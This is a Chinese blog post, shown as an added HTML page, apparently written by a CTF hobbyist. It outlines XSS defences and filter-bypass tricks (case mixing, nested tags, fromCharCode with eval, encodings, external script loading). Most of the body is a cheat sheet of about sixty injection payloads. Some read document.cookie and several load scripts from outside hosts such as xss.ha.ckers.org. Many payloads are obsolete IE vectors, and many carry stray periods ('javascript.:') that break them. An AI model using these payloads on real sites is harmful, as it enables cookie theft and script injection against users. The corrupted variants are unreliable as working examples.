@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>XSS注入常用语句 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="XSS,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>XSS注入常用语句</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-03-31
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="XSS主流防护技术"><a href="#XSS主流防护技术" class="headerlink" title="XSS主流防护技术"></a>XSS主流防护技术</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤，顾名思义，就是将提交上来的数据中的敏感词汇直接过滤掉。例如对<code>&quot;&lt;script&gt;&quot;、&quot;&lt;a&gt;&quot;、&quot;&lt;img&gt;</code>“等标签进行过滤，有的是直接删除这类标签中的内容，有的是过滤掉之类标签中的on事件或是’javascript’等字符串，让他们达不到预期的DOM效果。</p>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>像一些常见的字符，如”&lt;”、”&gt;”等。对这些字符进行转换编码或者转义，让他们不直接出现在脚本中，从而使浏览器不会去执行这段脚本</p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>玩过XSS的朋友应该都知道，精心构造一个攻击链接往往需要较长的字符串。那我干脆就对提交上来的数据长度做一个限制，这样就能解决一个即使真的存在一个XSS漏洞，但由于数据长度的限制而导致这个漏洞无法真正被利用的情况。</p>
+<h2 id="常见的绕过技术"><a href="#常见的绕过技术" class="headerlink" title="常见的绕过技术"></a>常见的绕过技术</h2><h3 id="防过滤"><a href="#防过滤" class="headerlink" title="防过滤"></a>防过滤</h3><p>有的网站会直接过滤<code>&quot;&lt;script&gt;&quot;、&quot;&lt;a&gt;&quot;、&quot;&lt;img&gt;&quot;</code>这些标签。在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则.比如：</p>
+<p><code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code><br>可以转换为：<br><code>&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;</code><br>对于只过滤一次“script”的情况我们还可以很巧合地把请求构造成这样：<br><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;</code><br>对于完全过滤”script”、”javascript”等脚本相关的字符时，我们可以使用DOM Based XSS，例如：<br><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<h4 id="JS还原函数"><a href="#JS还原函数" class="headerlink" title="JS还原函数"></a>JS还原函数</h4><p>JS中的编码还原函数最常用的就是<code>String.fromCharCode</code>了，这个函数用于ascii码的还原，一般来说，这个函数都要配合EVAL来使用才有效果。</p>
+<p>在跨站中，<code>String.fromCharCode</code>主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用<code>String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode</code>加以过滤，例如关键字alert被过滤掉，那就可以这么利用：</p>
+<p><code>&lt;img src=&quot;x&quot;/**/onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,112,111,114,117,105,110,39,41))&quot;&gt;&lt;/img&gt;</code></p>
+<h4 id="编码类："><a href="#编码类：" class="headerlink" title="编码类："></a>编码类：</h4><p>编码类绕过主要有URL编码，unicode编码，HTML编码，CSS编码和非常冷门的js-fuck编码</p>
+<ol>
+<li>URL编码</li>
+</ol>
+<p>URL编码最常见的是在用GET/POST传输时，顺序是把字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)。js处理URL编码的时候有三个函数可以使用，分别是escape()函数、encodeURI()函数 、encodeURIComponent()函数，对应的解码函数分别是unescape()、decodeURI()、decodeURIComponent()；</p>
+<ol start="2">
+<li>unicode编码</li>
+</ol>
+<p>Unicode编码的字符以%u为前缀，后面是这个字符的十六进制unicode的码点。当有些站点的后端验证可以识别Unicode编码的字符时，就可以用这个方法绕过了。</p>
+<ol start="3">
+<li>HTML编码</li>
+</ol>
+<p>HTML编码的存在就是让他在代码中和显示中分开， 避免错误。他的命名实体：构造是&amp;加上希腊字母，字符编码：构造是&amp;#加十进制、十六进制ASCII码或unicode字符编码，而且浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里。</p>
+<ol start="4">
+<li>CSS编码</li>
+</ol>
+<p>主要是利用css中的expression()表达式表达式中可以执行js脚本来达到攻击的目的，但是我刚刚测试了一下expression()表达式在IE7及以下是有效的，在IE8及以上就失效了，无法识别。这种方法目前应该是无法使用了。</p>
+<ol start="5">
+<li>Ascii编码</li>
+</ol>
+<p>这种方式主要利用了js的eval()函数和String.fromCharCode()函数。eval()函数是一个神奇的函数，可以用来计算一个字符串，将字符串变为js的表达式或者可执行语句,String.fromCharCode()函数则是将一段Ascii码转化为字符串。配合起来就例如下面的这一句代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">47</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">47</span>,<span class="number">41</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其作用相当于</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="针对限制"><a href="#针对限制" class="headerlink" title="针对限制"></a>针对限制</h3><p>既然限制了数据长度，那我们可以从外部引用一个自己写的js，而不是直接全部写在请求当中。比如先自己写一个内容为alert(1)的js文件，上传到自己的空间里，由于script允许从外部引入js脚本，所以我们加上这句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'xss.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>直接加载脚本，可以突破对数据长度的限制。</p>
+<p>下面是一些在XSS攻击中常用的语句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">&gt;"'&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript.:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;"'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">'javascript.:alert(([code])'</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">text/html</span> <span class="attr">data</span>=<span class="string">'javascript.:alert(([code]);'</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">"+alert('XSS')+"</span><br><span class="line"></span><br><span class="line">'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">='&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(vulnerable)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">s&amp;#99;ript</span>&gt;</span>alert('XSS')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javas&amp;#99;ript:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(\"Vulnerable\")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line"></span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"/javascript.:alert"</span>('<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"/JaVaScRiPt.:alert"</span>('<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"/JaVaScRiPt.:alert"</span>(&amp;<span class="attr">quot</span>;<span class="attr">XSS</span>&amp;<span class="attr">quot</span>;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x09;ascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0A;ascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0D;ascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">"<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"/java"</span>\<span class="attr">0script.:alert</span>(\"<span class="attr">XSS</span>\")&gt;</span>";'&gt;out</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">" javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">a=<span class="regexp">/XSS/</span>alert(a.source)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript.:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">"javascript.:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">"javascript.:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">"javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">SRC</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span><span class="attr">HREF</span>=<span class="string">"javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">'vbscript.:msgbox("XSS")'</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META.</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span><span class="attr">CONTENT</span>=<span class="string">"0;url=javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME.</span> <span class="attr">src</span>=<span class="string">"/javascript.:alert"</span>('<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME.</span> <span class="attr">src</span>=<span class="string">"/javascript.:alert"</span>('<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript.:alert('XSS')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript.:alert('XSS'))"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html&amp;#39;);"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">'xss:expre\ssion(alert("XSS"))'</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE.</span> <span class="attr">TYPE</span>=<span class="string">"text/javascript"</span>&gt;</span>alert('XSS');<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE.</span> <span class="attr">TYPE</span>=<span class="string">"text/css"</span>&gt;</span>.XSS&#123;background-image:url("javascript.:alert('XSS')");&#125;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">CLASS</span>=<span class="string">XSS</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE.</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span>BODY&#123;background:url("javascript.:alert('XSS')")&#125;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">HREF</span>=<span class="string">"javascript.:alert('XSS');//"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">getURL("javascript.:alert('XSS')")</span><br><span class="line"></span><br><span class="line">a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">SRC</span>=<span class="string">"javascript.:alert('XSS');"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">"&gt; <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">NLOAD</span>=<span class="string">"a();"</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;alert(<span class="string">'XSS'</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript.:alert('XSS')"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;SCRIPT. a="&gt;"SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT.="</span>&gt;</span>"SRC="http://xss.ha.ckers.org/a.js"&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT.</span> <span class="attr">a</span>=<span class="string">"&gt;"</span>''<span class="attr">SRC</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT."a='</span>&gt;</span>'"SRC="http://xss.ha.ckers.org/a.js"&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"&lt;SCRI"</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PTSRC="http://xss.ha.ckers.org/a.js"&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li><a href="https://www.cnblogs.com/xuehen/p/4814237.html" target="_blank" rel="noopener">xss常用语句整理</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1180217" target="_blank" rel="noopener">XSS学习笔记二</a></li>
+<li><a href="https://www.cnblogs.com/milantgh/p/3593888.html" target="_blank" rel="noopener">XSS绕过过滤方法</a></li>
+</ul>
+</blockquote>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/ee2d094d.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/XSS/">
+              #XSS
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/15b91408.html" target="_self">初识XSS攻击 XSS Challenges闯关1-4</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/7cffc1aa.html" target="_self">XSS challengs5-11通过过程</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
